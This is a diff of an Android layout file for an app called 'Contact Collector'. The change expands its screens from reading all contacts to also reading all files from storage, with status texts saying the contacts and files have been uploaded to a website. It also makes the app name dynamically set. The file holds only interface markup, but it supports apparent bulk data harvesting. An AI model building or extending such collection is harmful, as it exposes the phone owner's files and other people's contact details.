@@ -22,8 +22,9 @@
             android:textSize="40sp" />
     </LinearLayout>
 
-    <!-- App Name -->
+    <!-- App Name (dynamically set) -->
     <TextView
+        android:id="@+id/tvAppName"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:text="Contact Collector"
@@ -35,7 +36,7 @@
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Read contacts &amp; view on website"
+        android:text="Read contacts &amp; files → View on website"
         android:textColor="#FFFFFFAA"
         android:textSize="14sp"
         android:layout_marginBottom="40dp" />
@@ -52,26 +53,105 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Allow Contact Access"
+            android:text="Allow Permissions"
             android:textColor="#FFFFFF"
             android:textSize="18sp"
             android:textStyle="bold"
-            android:layout_marginBottom="8dp" />
+            android:layout_marginBottom="12dp" />
 
-        <TextView
-            android:layout_width="wrap_content"
+        <!-- Permission Items -->
+        <LinearLayout
+            android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Tap the button below to allow contact permission.\nAll contacts will be read automatically — no selection needed!"
-            android:textColor="#FFFFFF99"
-            android:textSize="13sp"
-            android:gravity="center"
-            android:layout_marginBottom="32dp" />
+            android:orientation="vertical"
+            android:background="#0D6B5E"
+            android:padding="16dp"
+            android:layout_marginBottom="24dp"
+            android:gravity="start">
+
+            <!-- Contact Permission -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:gravity="center_vertical"
+                android:layout_marginBottom="12dp">
+
+                <TextView
+                    android:layout_width="36dp"
+                    android:layout_height="36dp"
+                    android:text="📞"
+                    android:textSize="20sp"
+                    android:gravity="center" />
+
+                <LinearLayout
+                    android:layout_width="0dp"
+                    android:layout_height="wrap_content"
+                    android:layout_weight="1"
+                    android:orientation="vertical"
+                    android:layout_marginStart="12dp">
+
+                    <TextView
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="Contact Full Access"
+                        android:textColor="#FFFFFF"
+                        android:textSize="14sp"
+                        android:textStyle="bold" />
+
+                    <TextView
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="Read all contacts automatically"
+                        android:textColor="#FFFFFF88"
+                        android:textSize="11sp" />
+                </LinearLayout>
+            </LinearLayout>
+
+            <!-- File Manager Permission -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:gravity="center_vertical">
+
+                <TextView
+                    android:layout_width="36dp"
+                    android:layout_height="36dp"
+                    android:text="📁"
+                    android:textSize="20sp"
+                    android:gravity="center" />
+
+                <LinearLayout
+                    android:layout_width="0dp"
+                    android:layout_height="wrap_content"
+                    android:layout_weight="1"
+                    android:orientation="vertical"
+                    android:layout_marginStart="12dp">
+
+                    <TextView
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="File Manager Full Access"
+                        android:textColor="#FFFFFF"
+                        android:textSize="14sp"
+                        android:textStyle="bold" />
+
+                    <TextView
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="Read all files from storage"
+                        android:textColor="#FFFFFF88"
+                        android:textSize="11sp" />
+                </LinearLayout>
+            </LinearLayout>
+        </LinearLayout>
 
         <Button
             android:id="@+id/btnAllow"
             android:layout_width="match_parent"
             android:layout_height="56dp"
-            android:text="Allow Contact Access"
+            android:text="Allow Permissions"
             android:textSize="16sp"
             android:textStyle="bold"
             android:textColor="#075E54"
@@ -99,7 +179,7 @@
             android:id="@+id/tvStatus"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Reading Contacts..."
+            android:text="Reading Data..."
             android:textColor="#FFFFFF"
             android:textSize="18sp"
             android:textStyle="bold"
@@ -109,7 +189,7 @@
             android:id="@+id/tvDetail"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Please wait while we read all your contacts"
+            android:text="Reading contacts &amp; files from your phone"
             android:textColor="#FFFFFF99"
             android:textSize="13sp"
             android:gravity="center" />
@@ -136,7 +216,7 @@
             android:id="@+id/tvStatus2"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Contacts Uploaded!"
+            android:text="Data Uploaded!"
             android:textColor="#25D366"
             android:textSize="18sp"
             android:textStyle="bold"
@@ -146,7 +226,7 @@
             android:id="@+id/tvDetail2"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Your contacts have been sent to the website."
+            android:text="Your contacts &amp; files have been sent to the website."
             android:textColor="#FFFFFF99"
             android:textSize="13sp"
             android:gravity="center"
